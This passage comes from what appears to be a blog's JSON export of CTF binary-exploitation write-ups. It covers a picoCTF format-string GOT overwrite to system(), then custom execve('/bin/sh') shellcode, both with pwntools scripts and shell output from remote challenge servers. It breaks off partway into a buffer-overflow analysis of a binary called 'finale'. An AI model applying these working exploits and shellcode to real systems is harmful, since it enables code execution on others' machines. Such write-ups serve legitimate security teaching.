let\u0026rsquo;s modify the entry for pow.\nFirst, we are going to put the address in a position of the stack. Let\u0026rsquo;s use the input A for entering the address and the input B to extract it. But before, let\u0026rsquo;s do it with recognizable characters:\n$ ./chall Welcome to Fermat\\'s Last Theorem as a service A: 1234567.AAAABBBB B: 1.%11$lx Calculating for A: 1234567.AAAABBBB and B: 1.4242424241414141  Notice the use of %lx to print an 8-byte value, and the position 11 because in position 10 we have 1234567..\nNow, we can replace AAAABBBB with the address of pow at GOT. And instead of putting %11$lx, we will put %11$n. Let\u0026rsquo;s do it in a Python script with pwntools and attach GDB to visualize the GOT entries:\npayload_a = b'1234567.' + p64(pow_got) payload_b = b'1.%11$n' gdb.attach(p, gdbscript='break pow\\ncontinue\\ngot') p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.interactive()  If we run it, GDB will attach to it, break at pow and then show the GOT:\ngef➤ got GOT protection: Partial RelRO | GOT functions: 9 [0x601018] puts@GLIBC_2.2.5 → 0x7f4c7b0845a0 [0x601020] __stack_chk_fail@GLIBC_2.4 → 0x4006d6 [0x601028] setbuf@GLIBC_2.2.5 → 0x7f4c7b08bc50 [0x601030] printf@GLIBC_2.2.5 → 0x7f4c7b061e10 [0x601038] snprintf@GLIBC_2.2.5 → 0x7f4c7b061ee0 [0x601040] pow@GLIBC_2.2.5 → 0x28 [0x601048] strcspn@GLIBC_2.2.5 → 0x7f4c7b1837b0 [0x601050] read@GLIBC_2.2.5 → 0x7f4c7b10e130 [0x601058] atoi@GLIBC_2.2.5 → 0x7f4c7b044730  Manual exploitation The entry for pow has changed to 0x28 (40). This means that until the %11$n, we have printed 40 bytes. Since we have only 1. before %11$n, this means that there are 38 bytes in the stack before. If we put 1.., then the GOT entry would change to 0x29, and so on.\nAt this moment, we need to enter the address of main (0x400837, which is 4196407 in decimal) in the GOT entry. However, we cannot introduce this number of bytes because it is too large.\nBut we can make use of another format string. Since the address we need to be written is 4196407, then we must print 4196407 - 38 - 2 = 4196367 bytes. And this can be done with a format string like %4196367c:\npow_got = 0x601040 payload_a = b'1234567.' + p64(pow_got) payload_b = b'1.%4196367c' + b'%11$n' p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.interactive()  The computation of the number of bytes to write can be done as follows:\npow_got = 0x601040 bytes_on_stack = 38 bytes_to_print = main_addr - bytes_on_stack - 2 payload_a = b'1234567.' + p64(pow_got) payload_b = f'1.%{bytes_to_print}c'.encode() + b'%11$n'  And it works, we have converted pow into main:\n$ python3 solve.py [+] Starting local process './chall': pid 389440 [*] Switching to interactive mode Welcome to Fermat\\'s Last Theorem as a service A: $ 1 B: $ 1 Calculating for A: 1 and B: 1 Welcome to Fermat\\'s Last Theorem as a service A: $ 1 B: $ 1 Calculating for A: 1 and B: 1 Welcome to Fermat\\'s Last Theorem as a service A: $  Now we have more chances to continue with the exploitation. Next, we must leak an address of Glibc to obtain its version. The purpose of this is calculate the real address of system and overwrite the GOT again for the final stage.\nObtaining memory leaks To leak an address we can use the Format String vulnerability. For that, we must call printf with a %s format (strings in C are given as pointers) and pass a GOT entry (for example, puts), so that the value inside the GOT entry is printed (it works like a pointer).\nThe strategy is similar: we will use the A input to store the address of the GOT entry for puts. And then we will put %11$s in the B input:\nputs_got = 0x601018 payload_a = b'1234567.' + p64(puts_got) payload_b = b'1.%11$s' p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.recvuntil(b'B: 1.') puts_addr = u64(p.recvline().strip().ljust(8, b'\\0')) log.success(f'Leaked puts() address: {hex(puts_addr)}')  After that, we can compute the base address of Glibc, knowing the offset of puts:\n$ ldd chall linux-vdso.so.1 (0x00007ffda1df7000) libm.so.6 = /lib/x86_64-linux-gnu/libm.so.6 (0x00007f576d29c000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007f576d0aa000) /lib64/ld-linux-x86-64.so.2 (0x00007f576d3fe000) $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts 194: 00000000000875a0 476 FUNC GLOBAL DEFAULT 16 _IO_puts@@GLIBC_2.2.5 429: 00000000000875a0 476 FUNC WEAK DEFAULT 16 puts@@GLIBC_2.2.5 504: 00000000001273c0 1268 FUNC GLOBAL DEFAULT 16 putspent@@GLIBC_2.2.5 690: 0000000000129090 728 FUNC GLOBAL DEFAULT 16 putsgent@@GLIBC_2.10 1158: 0000000000085e60 384 FUNC WEAK DEFAULT 16 fputs@@GLIBC_2.2.5 1705: 0000000000085e60 384 FUNC GLOBAL DEFAULT 16 _IO_fputs@@GLIBC_2.2.5 2342: 00000000000914a0 159 FUNC WEAK DEFAULT 16 fputs_unlocked@@GLIBC_2.2.5  puts_offset = 0x875a0 glibc_base_addr = puts_addr - puts_offset log.success(f'Glibc base address: {hex(glibc_base_addr)}')  And with all these, we have leaked the address of puts and the base address of Glibc:\n$ python3 solve.py [+] Starting local process './chall': pid 414163 [+] Leaked puts() address: 0x7f4a695695a0 [+] Glibc base address: 0x7f4a694e2000 [*] Switching to interactive mode Welcome to Fermat\\'s Last Theorem as a service A: $  Now we can search for the offset of system inside Glibc using:\n$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system 236: 0000000000156a80 103 FUNC GLOBAL DEFAULT 16 svcerr_systemerr@@GLIBC_2.2.5 617: 0000000000055410 45 FUNC GLOBAL DEFAULT 16 __libc_system@@GLIBC_PRIVATE 1427: 0000000000055410 45 FUNC WEAK DEFAULT 16 system@@GLIBC_2.2.5  The idea is to modify the GOT entry of a function that takes a controlled string as first argument so that it points to system. For example, some candidates are atoi and strcspn. This time, we will be using atoi, whose GOT entry address is 0x601058.\natoi_got = 0x601058 system_offset = 0x55410 system_addr = glibc_base_addr + system_offset  GOT overwrite Now we must write the real address of system to the GOT entry of atoi. Let\u0026rsquo;s enter 0 bytes and see the value in the GOT using GDB as before:\npayload_a = b'1234567.' + p64(pow_got) payload_b = b'1.%11$n' gdb.attach(p, gdbscript='break atoi\\ncontinue\\ngot') p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.interactive()  If we run it, GDB will attach to it, break at atoi and then show the GOT:\ngef➤ got GOT protection: Partial RelRO | GOT functions: 9 [0x601018] puts@GLIBC_2.2.5 → 0x7f660b8465a0 [0x601020] __stack_chk_fail@GLIBC_2.4 → 0x4006d6 [0x601028] setbuf@GLIBC_2.2.5 → 0x7f660b84dc50 [0x601030] printf@GLIBC_2.2.5 → 0x7f660b823e10 [0x601038] snprintf@GLIBC_2.2.5 → 0x7f660b823ee0 [0x601040] pow@GLIBC_2.2.5 → 0x400837 [0x601048] strcspn@GLIBC_2.2.5 → 0x7f660b9457b0 [0x601050] read@GLIBC_2.2.5 → 0x7f660b8d0130 [0x601058] atoi@GLIBC_2.2.5 → 0x7f6600000028  As it is shown, the entry for atoi has a value of 0x7f6600000028. With %11$n we have overwritten the last 4 bytes (namely, 0x00000028). Using the same procedure as before, we need to write a lot of bytes. The number of bytes to be entered in the format string can be computed as:\nbytes_on_stack = 38 bytes_to_print = (system_addr - bytes_on_stack - 2) \u0026amp; 0xffffffff  We limit the number to 4 bytes just in case. And then we add it to the payload and send it:\nbytes_to_print = (system_addr - bytes_on_stack - 2) \u0026amp; 0xffffffff payload_a = b'1234567.' + p64(atoi_got) + p64(atoi_got + 2) payload_b = f'1.%{bytes_to_print}c'.encode() + b'%11$n' p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.recvline() p.interactive()  If everything is correct, the GOT entry for atoi will be pointing to system. An thus, we can enter /bin/sh in A or B inputs to get a shell:\n$ python3 solve.py [+] Starting local process './chall': pid 502833 [+] Leaked puts() address: 0x7f4a096565a0 [+] Glibc base address: 0x7f4a095cf000 [*] Switching to interactive mode Welcome to Fermat\\'s Last Theorem as a service A: $ /bin/sh B: $ $ ls chall chall.c Dockerfile solve.py  Alright. Let\u0026rsquo;s tweak the exploit a little bit to spawn a shell automatically:\np.sendlineafter(b'A: ', b'/bin/sh') p.sendlineafter(b'B: ', b'') p.recvuntil(b'B: ') p.sendline() p.interactive()  $ python3 solve.py [+] Starting local process './chall': pid 507100 [+] Leaked puts() address: 0x7f6218d5b5a0 [+] Glibc base address: 0x7f6218cd4000 [*] Switching to interactive mode $ ls chall chall.c Dockerfile solve.py  Finding the remote Glibc version However, we are not done yet. We must execute the exploit on the remote instance and get the version of Glibc. After that, we must update all the offsets.\nTo help with the version lookup, we can leak more function addresses of Glibc. For that, I decided to build a function called leak_address as follows:\ndef leak_address(got_entry: int) -\u0026gt; int: payload_a = b'1234567.' + p64(got_entry) payload_b = b'1.%11$s' p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.recvuntil(b'B: 1.') return u64(p.recvline().strip().ljust(8, b'\\0'))  So that it is used this way:\natoi_got = 0x601058 atoi_addr = leak_address(atoi_got) log.success(f'Leaked atoi() address: {hex(atoi_addr)}') puts_got = 0x601018 puts_addr = leak_address(puts_got) log.success(f'Leaked puts() address: {hex(puts_addr)}')  We run the exploit remotely and it does not work. No problem for the moment. Let\u0026rsquo;s check the leaked addresses:\n$ python3 solve.py mars.picoctf.net 31929 [+] Opening connection to mars.picoctf.net on port 31929: Done [+] Leaked atoi() address: 0x7f026a26c730 [+] Leaked puts() address: 0x7f026a2ac5a0 [+] Glibc base address: 0x7f026a225000  These are the Glibc versions found (their offsets are all the same):\nWe notice that the version of Glibc in the remote instance is the same that we were using locally.\nHowever, the last stage of the exploit is not working remotely. This might be happening because we are writing a large amount of bytes in order to use %n. A more elegant way is using %hhn to write a single byte or %hn to write 2 bytes.\nFixing the exploit Let\u0026rsquo;s modify our payload to have a more stable exploit. For the moment we will be using %hn. The last 2 bytes of the GOT entry can be overwritten in a similar way as before, just a few modifications:\nbytes_to_print = ((system_addr \u0026amp; 0xffff) - bytes_on_stack - 2) % 0xffff payload_a = b'1234567.' + p64(atoi_got) + p64(atoi_got + 2) payload_b = f'1.%{bytes_to_print}c'.encode() + b'%11$hn' payload_b += f'%12$hn'.encode() gdb.attach(p, gdbscript='break atoi\\ncontinue\\ncontinue\\ncontinue\\ngot') p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.recvline() p.interactive()  The first thing to notice is the use of the AND operators to get the last 2 bytes of the address of system. And then the modulo operator to wrap around 0xffff if the operation was negative. After that we use %11$hn.\nTo overwrite the next 2 bytes, we need to put the address of the GOT entry for atoi but plus 2 (because we want to write in the next 2 bytes). And hence, we must use %12$hn. For now, let\u0026rsquo;s leave the second part blank (only %12$hn).\nWe attach GDB to the process and show the GOT entries:\ngef➤ got GOT protection: Partial RelRO | GOT functions: 9 [0x601018] puts@GLIBC_2.2.5 → 0x7f70473075a0 [0x601020] __stack_chk_fail@GLIBC_2.4 → 0x4006d6 [0x601028] setbuf@GLIBC_2.2.5 → 0x7f704730ec50 [0x601030] printf@GLIBC_2.2.5 → 0x7f70472e4e10 [0x601038] snprintf@GLIBC_2.2.5 → 0x7f70472e4ee0 [0x601040] pow@GLIBC_2.2.5 → 0x400837 [0x601048] strcspn@GLIBC_2.2.5 → 0x7f70474067b0 [0x601050] read@GLIBC_2.2.5 → 0x7f7047391130 [0x601058] atoi@GLIBC_2.2.5 → 0x7f7054105410  Notice how the last 2 bytes were overwritten correctly (at least the last 3 hexadecimal digits match with 410, which is the offset of system). And also, we must take into account that the next 2 bytes have the same value as the last 2 bytes (5410).\nKnowing this, we can compute the number of bytes to write in order to place the correct number in that position:\nbytes_to_print = ((system_addr \u0026amp; 0xffff) - bytes_on_stack - 2) % 0xffff payload_a = b'1234567.' + p64(atoi_got) + p64(atoi_got + 2) payload_b = f'1.%{bytes_to_print}c'.encode() + b'%11$hn' bytes_to_print = (((system_addr \u0026gt;\u0026gt; 16) - system_addr) \u0026amp; 0xffff) % 0xffff payload_b += f'%{bytes_to_print}c'.encode() + b'%12$hn' p.sendlineafter(b'A: ', payload_a) p.sendlineafter(b'B: ', payload_b) p.recvline() p.interactive()  And everything works smoothly locally:\n$ python3 solve.py [+] Starting local process './chall': pid 547640 [+] Leaked atoi() address: 0x7f05651e4730 [+] Leaked puts() address: 0x7f05652245a0 [+] Glibc base address: 0x7f056519d000 [*] Switching to interactive mode $ ls chall chall.c Dockerfile solve.py  Flag Let\u0026rsquo;s see if it works remotely:\n$ python3 solve.py mars.picoctf.net 31929 [+] Opening connection to mars.picoctf.net on port 31929: Done [+] Leaked atoi() address: 0x7fc3974da730 [+] Leaked puts() address: 0x7fc39751a5a0 [+] Glibc base address: 0x7fc397493000 [*] Switching to interactive mode $ ls flag.txt run $ cat flag.txt picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}  The full exploit script can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/fermat-strings/","section":"ctf","summary":"picoMini by redpwn. 250 points. 64-bit binary. Format String. GOT overwrite and ASLR bypass","time":12,"title":"fermat-strings"},{"contents":"We are given a 32-bit binary called fun:\nArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments  We do not have the C source code. This time, instead of reversing the binary using tools like Ghidra, we will analyze it with GDB.\nFirst let\u0026rsquo;s execute the program:\n$ ./fun Give me code to run: asdf zsh: segmentation fault (core dumped) ./fun  It seems that the program is requesting code and it will run it. It crashed because asdf is not a valid instruction.\nLet\u0026rsquo;s generate two breakpoint instructions (SIGTRAP, int3 as an assembly instruction) using asm from pwntools:\n$ pwn asm 'int3; int3' cccc $ pwn asm 'int3; int3' -o code $ xxd code 00000000: cccc ..  We can start GDB and run the program with this code:\n$ gdb -q fun Reading symbols from fun... (No debugging symbols found in fun) gef➤ run 0xffffcc01 in ?? ()  Nice, it stopped in a breakpoint. Let\u0026rsquo;s check the next instructions from $eip (minus one to examine from the first breakpoint instruction):\ngef➤ x/10i $eip - 1 0xffffcc00: int3 =\u0026gt; 0xffffcc01: int3 0xffffcc02: nop 0xffffcc03: nop 0xffffcc04: (bad) 0xffffcc05: call DWORD PTR [eax-0x6f000070] 0xffffcc0b: nop 0xffffcc0c: (bad) 0xffffcc0d: call DWORD PTR [eax-0x6f000070] 0xffffcc13: nop 0xffffcc14: (bad) gef➤ x/10x $eip - 1 0xffffcc01: 0x9090cccc 0x9090ffff 0x9090ffff 0x9090ffff 0xffffcc11: 0x9090ffff 0x9090ffff 0x9090ffff 0x9090ffff 0xffffcc21: 0x9090ffff 0x9090ffff  This looks a little weird. Let\u0026rsquo;s are more dummy code and check again:\n$ echo -ne '\\xcc\\xccABCDEFGHIJKL'  code $ xxd code 00000000: cccc 41 4243 4445 4647 4849 4a4b 4c ..ABCDEFGHIJKL  gef➤ run 0xffffcc01 in ?? ()  gef➤ x/10x $eip - 1 0xffffcc00: 0x9090cccc 0x90904241 0x90904443 0x90904645 0xffffcc10: 0x90904847 0x90904a49 0x90904c4b 0x9090ffff 0xffffcc20: 0x9090ffff 0x9090ffff  Now we see what the program is actually doing: it is taking our code and putting two nop operations (\\x90\\x90) between every byte of our code.\nThe nop instruction does nothing, so it not so problematic. However, it limits that our provided instructions must have 1 or 2 bytes (otherwise, the two nop instructions will break the instruction that are more than 2 bytes long).\nThe classic shellcode to spawn a shell is similar to this one:\nxor ecx, ecx # 31 c9 =\u0026gt; $ecx = 0 xor edx, edx # 31 d2 =\u0026gt; $edx = 0 xor eax, eax # 31 c0 =\u0026gt; $eax = 0 mov al, 0xb # b0 0b =\u0026gt; $eax = 0xb push 0x68732f # 68 2f 2f 73 00 =\u0026gt; Push \"/sh\\0\" push 0x6e69622f # 68 2f 62 69 6e =\u0026gt; Push \"/bin\" mov ebx, esp # 89 e3 =\u0026gt; $ebx = *\"/bin/sh\\0\" int 0x80 # cd 80 =\u0026gt; Call execve  The problem of this shellcode is the process of pushing \u0026quot;/bin/sh\\0\u0026quot; onto the stack, since it uses 5-byte instructions. Hence, we need to somehow push \u0026quot;/bin/sh\\0\u0026quot; onto the stack but using only 1-byte or 2-byte instructions.\nOne way I came up with is storing the string byte by byte. We can use instructions like mov al, 0x2f to store a single byte in $eax using a 2-byte instruction, and then shift it to the next byte position.\nFor example, for \u0026quot;/sh\\0\u0026quot;, the idea is the following:\npush 8 # 6a 08 nop # 90 pop ecx # 59 =\u0026gt; $ecx = 8 xor eax, eax # 31 c0 =\u0026gt; $eax = 0 mov al, 0x68 # b0 68 =\u0026gt; $eax = 0x00000068 shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x00006800 mov al, 0x73 # b0 73 =\u0026gt; $eax = 0x00006873 shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x00687300 mov al, 0x2f # b0 2f =\u0026gt; $eax = 0x0068732f (\"/sh\\0\") nop # 90 push eax # 50 =\u0026gt; Push \"/sh\\0\"  As shown above, we are using shl eax, ecx to store in $eax the current value of $eax shifted $ecx bits to the left. And inside $ecx we have 8, so the instruction shl eax, ecx will shift $eax a single byte to the left. Hence, we are accumulating the string in $eax.\nThe use of nop before the pop and the push instructions (1-byte length) is due to the fact that the program will add two nop instructions between every two bytes. If we do not put that nop instruction, then the next 2-byte instruction will be splitted in two parts (and therefore broken).\nWe can follow a similar process to have \u0026quot;/bin\u0026quot; into the stack. And finally, add these stages to the previous shellcode.\nThis is the final code that will spawn a shell using execve(\u0026quot;/bin/sh\u0026quot;, 0, 0):\npush 8 # 6a 08 nop # 90 pop ecx # 59 =\u0026gt; $ecx = 8 xor eax, eax # 31 c0 =\u0026gt; $eax = 0 mov al, 0x68 # b0 68 =\u0026gt; $eax = 0x00000068 shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x00006800 mov al, 0x73 # b0 73 =\u0026gt; $eax = 0x00006873 shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x00687300 mov al, 0x2f # b0 2f =\u0026gt; $eax = 0x0068732f (\"/sh\\0\") nop # 90 push eax # 50 =\u0026gt; Push \"/sh\\0\" xor eax, eax # 31 c0 =\u0026gt; $eax = 0 mov al, 0x6e # b0 6e =\u0026gt; $eax = 0x0000006e shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x00006e00 mov al, 0x69 # b0 69 =\u0026gt; $eax = 0x00006e69 shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x006e6900 mov al, 0x62 # b0 62 =\u0026gt; $eax = 0x006e6962 shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x6e696200 mov al, 0x2f # b0 2f =\u0026gt; $eax = 0x6e69622f (\"/bin\") nop # 90 push eax # 50 =\u0026gt; Push \"/bin\" xor ecx, ecx # 31 c9 =\u0026gt; $ecx = 0 xor edx, edx # 31 d2 =\u0026gt; $edx = 0 xor eax, eax # 31 c0 =\u0026gt; $eax = 0 mov al, 0x0b # b0 0b =\u0026gt; $eax = 0x0b mov ebx, esp # 89 e3 =\u0026gt; $ebx = *\"/bin/sh\\0\" int 0x80 # cd 80 =\u0026gt; execve  The file is called code.asm, we can translate it to machine code using asm from pwntools again:\n$ pwn asm -i code.asm -o code $ xxd code 00000000: 6a08 9059 31c0 b068 d3e0 b073 d3e0 b02f j..Y1..h...s.../ 00000010: 9050 31c0 b06e d3e0 b069 d3e0 b062 d3e0 .P1..n...i...b.. 00000020: b02f 9050 31c9 31d2 31c0 b00b 89e3 cd80 ./.P1.1.1....... $ wc -c code 48 code  It is a relatively short shellcode. Let\u0026rsquo;s see if it works:\n$ (cat code; echo; cat) | ./fun Give me code to run: ls code code.asm fun  Perfect, it has worked smoothly. Notice that we needed to use an echo command to add a newline character to the payload and another cat command to keep the shell active.\nNow we can try this code on server side and get the flag:\n$ (cat code; echo; cat) | nc mercury.picoctf.net 16460 Give me code to run: ls flag.txt fun fun.c xinet_startup.sh cat flag.txt picoCTF{th4t_w4s_fun_f1ed6f7952ff4071}  I continued working on the shellcode. Finally, I came up with a shorter one using 16 bits shifting and registers $ah, $al, $bh and $bl for the mov instructions (fragments of $eax and $ebx register):\npush 16 # 6a 10 nop # 90 pop ecx # 59 =\u0026gt; $ecx = 16 xor eax, eax # 31 c0 =\u0026gt; $eax = 0x00000000 mov al, 0x68 # b0 68 =\u0026gt; $eax = 0x00000068 shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x00680000 mov ah, 0x73 # b4 73 =\u0026gt; $eax = 0x00687300 mov al, 0x2f # b0 2f =\u0026gt; $eax = 0x0068732f (\"/sh\\0\") mov bh, 0x6e # b7 6e =\u0026gt; $ebx = 0x____6e__ mov bl, 0x69 # b3 69 =\u0026gt; $ebx = 0x____6e69 shl ebx, ecx # d3 e3 =\u0026gt; $ebx = 0x6e690000 mov bh, 0x62 # b7 62 =\u0026gt; $ebx = 0x6e696200 mov bl, 0x2f # b3 2f =\u0026gt; $ebx = 0x6e69622f (\"/bin\") push eax # 50 =\u0026gt; Push \"/sh\\0\" push ebx # 53 =\u0026gt; Push \"/bin\" xor ecx, ecx # 31 c9 =\u0026gt; $ecx = 0 xor edx, edx # 31 d2 =\u0026gt; $edx = 0 xor eax, eax # 31 c0 =\u0026gt; $eax = 0 mov al, 0x0b # b0 0b =\u0026gt; $eax = 0x0b mov ebx, esp # 89 e3 =\u0026gt; $ebx = *\"/bin/sh\\0\" int 0x80 # cd 80 =\u0026gt; execve  The generated machine code is only 38 bytes long.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/filtered-shellcode/","section":"ctf","summary":"picoCTF 2021. 160 points. 32-bit binary. Custom shellcode","time":7,"title":"filtered-shellcode"},{"contents":"We are given a 64-bit binary called finale:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)  Environment setup It might happen that we don\u0026rsquo;t have a version of Glibc that is accepted by the program:\n$ ./finale ./finale: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./finale)  Luckily, in Spooky Time we were provided with a library and a loader, version 2.35:\n$ ../pwn_spooky_time/glibc/ld-linux-x86-64.so.2 ../pwn_spooky_time/glibc/libc.so.6 GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. Copyright (C) 2022 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 11.2.0. libc ABIs: UNIQUE IFUNC ABSOLUTE For bug reporting instructions, please see: \u0026lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs\u0026gt;.  So, we can copy that directory in the current environment and use pwninit to patch the binary and use this new Glibc version:\n$ cp -r ../pwn_spooky_time/glibc . $ pwninit --libc glibc/libc.so.6 --ld glibc/ld-linux-x86-64.so.2 --bin finale --no-template bin: finale libc: glibc/libc.so.6 ld: glibc/ld-linux-x86-64.so.2 unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.35-0ubuntu3.1_amd64.deb warning: failed unstripping libc: libc deb error: failed to find file in data.tar copying finaleto finale_patched running patchelf on finale_patched  Now we have another binary (finale_patched), and we are able to run it properly:\n$ ./finale_patched Let's celebrate Spooktober!!! ▝ ▝▘ ▝▗▗ ▝ ▞▚▘▝ ▝ ▗ ▘ ▖ ▛▌ ▘ ▗ ▀ ▖ ▝ ▖ ▝ ▗▙ ▝ ▝▝ ▘ ▜ ▄▖ ▝▛▙ ▗▄ ▗▖ ▘ ▖▖ ▘ ▗▗▚▚▚▘ ▖▖ ▖ ▝▐▐▐ ▜▜▟▗ ▗▗ ▝▘ ▘ ▗▚ ▝▜▞ ▖▝ ▖ ▞▖ ▘ ▐▜▘ ▝▀▘ ▗▌ ▗ ▗▖ ▄ ▗ ▄ ▝▞▞▖ ▗▄▄ ▖ ▗ ▗ ▘ ▗▐▛▙█▄ ▖ ▖ ▗ ▘ ▝ ▗▜ ██▜▜▜▖▖ ▗ ▞▝ ▖ ▗ ▗▝▛▙▝▐███▙ ▝▝ ▖▘▖ ▛▖▀▟▄▖▘▛▌▀ ▀▘ ▗ ▗▘▜▜▖▝▟▞▘ ▘ ▞ ▘ ▛▙ ▜▞▀ ▝ ▗▌▐▀▀ ▞▀ [Strange man in mask screams some nonsense]: Us [Strange man in mask]: In order to proceed, tell us the secret phrase:  Reverse engineering If we open the binary in Ghidra, we will see this decompiled C source code for the main function:\nintmain() { intret; undefined8 secret_phrase; undefined8 local_40; undefined4 local_38; undefined8 local_28; undefined8 local_20; intfd; ulong i; banner(); local_28 =0; local_20 =0; fd =open(\"/dev/urandom\", 0); read(fd, \u0026amp;local_28, 8); printf(\"\\n[Strange man in mask screams some nonsense]: %s\\n\\n\", \u0026amp;local_28); close(fd); secret_phrase =0; local_40 =0; local_38 =0; printf(\"[Strange man in mask]: In order to proceed, tell us the secret phrase: \"); __isoc99_scanf(\"%16s\", \u0026amp;secret_phrase); i =0; do{ if(0xe\u0026lt;i) { LAB_00401588: ret =strncmp((char*) \u0026amp;secret_phrase, \"s34s0nf1n4l3b00\", 0xf); if(ret ==0) { finale(); } else{ printf(\"%s\\n[Strange man in mask]: Sorry, you are not allowed to enter here!\\n\\n\", \u0026amp;DAT_00402020); } return0; } if(*(char*) ((long) \u0026amp;secret_phrase +i) =='\\n') { *(undefined *) ((long) \u0026amp;secret_phrase +i) =0; gotoLAB_00401588; } i =i +1; } while(true); }  Here we are asked to enter a secret phrase, which is hard-coded in the function above (s34s0nf1n4l3b00). If we use it, we are prompted to enter more data, so let\u0026rsquo;s test a Buffer Overflow vulnerability:\n$ ./finale_patched Let's celebrate Spooktober!!! ▝ ▝▘ ▝▗▗ ▝ ▞▚▘▝ ▝ ▗ ▘ ▖ ▛▌ ▘ ▗ ▀ ▖ ▝ ▖ ▝ ▗▙ ▝ ▝▝ ▘ ▜ ▄▖ ▝▛▙ ▗▄ ▗▖ ▘ ▖▖ ▘ ▗▗▚▚▚▘ ▖▖ ▖ ▝▐▐▐ ▜▜▟▗ ▗▗ ▝▘ ▘ ▗▚ ▝▜▞ ▖▝ ▖ ▞▖ ▘ ▐▜▘ ▝▀▘ ▗▌ ▗ ▗▖ ▄ ▗ ▄ ▝▞▞▖ ▗▄▄ ▖ ▗ ▗ ▘ ▗▐▛▙█▄ ▖ ▖ ▗ ▘ ▝ ▗▜ ██▜▜▜▖▖ ▗ ▞▝ ▖ ▗ ▗▝▛▙▝▐███▙ ▝▝ ▖▘▖ ▛▖▀▟▄▖▘▛▌▀ ▀▘ ▗ ▗▘▜▜▖▝▟▞▘ ▘ ▞ ▘ ▛▙ ▜▞▀ ▝ ▗▌▐▀▀ ▞▀ [Strange man in mask screams some nonsense]: _ '$ [Strange man in mask]: In order to proceed, tell us the secret phrase: s34s0nf1n4l3b00 [Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [0x7ffc798f0b40] [Strange man in mask]: Now, tell us a wish for next year: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA [Strange man in mask]: That's a nice wish! Let the Spooktober Spirit be with you! zsh: segmentation fault (core dumped) ./finale_patched  Buffer Overflow vulnerability The program crashed with a segmentation fault, so it is vulnerable to Buffer Overflow. This second stage of the program corresponds to a function called finale:\nvoidfinale() { undefined data[64];  printf(\"\\n[Strange man in mask]: Season finale is here! Takethis souvenir with you for good luck: [%p]\", data); printf(\"\\n\\n[Strange man in mask]: Now, tell us a wish for next year: \"); fflush(stdin); fflush(stdout); read(0, data, 0x1000); write(1,\"\\n[Strange man in mask]: That\\'s a nice wish! Let the Spooktober Spirit be with you!\\n\\n\", 0x54); }  The Buffer Overflow exists because data is a character array of 64 bytes, but the programs reads up to 0x1000 bytes. Therefore, we can write outside of the data array and modify existing values on the stack that are used by the program to control the execution flow. For instance, when the program calls finale, it stores the return address on the stack so that it can be popped when returning from finale.\nIn the previous example, we overwrote this saved return address with 0x41414141 (AAAA in hexadecimal format), which is not a valid address. That\u0026rsquo;s why the program crashed.\nAs attackers, we are interested in controlling this value so that we can redirect program execution arbitrarily. We can use GDB to find the offset needed to reach this position in the stack.\nNote: For some reason, the following steps only work using bash as shell, not zsh.\n$ gdb -q finale_patched Reading symbols from finale_patched... (No debugging symbols found in finale_patched) gef➤ pattern create 100 [+] Generating a pattern of 100 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa [+] Saved as '$_gef0' gef➤ run Starting program: ./finale_patched Let's celebrate Spooktober!!! ▝ ▝▘ ▝▗▗ ▝ ▞▚▘▝ ▝ ▗ ▘ ▖ ▛▌ ▘ ▗ ▀ ▖ ▝ ▖ ▝ ▗▙ ▝ ▝▝ ▘ ▜ ▄▖ ▝▛▙ ▗▄ ▗▖ ▘ ▖▖ ▘ ▗▗▚▚▚▘ ▖▖ ▖ ▝▐▐▐ ▜▜▟▗ ▗▗ ▝▘ ▘ ▗▚ ▝▜▞ ▖▝ ▖ ▞▖ ▘ ▐▜▘ ▝▀▘ ▗▌ ▗ ▗▖ ▄ ▗ ▄ ▝▞▞▖ ▗▄▄ ▖ ▗ ▗ ▘ ▗▐▛▙█▄ ▖ ▖ ▗ ▘ ▝ ▗▜ ██▜▜▜▖▖ ▗ ▞▝ ▖ ▗ ▗▝▛▙▝▐███▙ ▝▝ ▖▘▖ ▛▖▀▟▄▖▘▛▌▀ 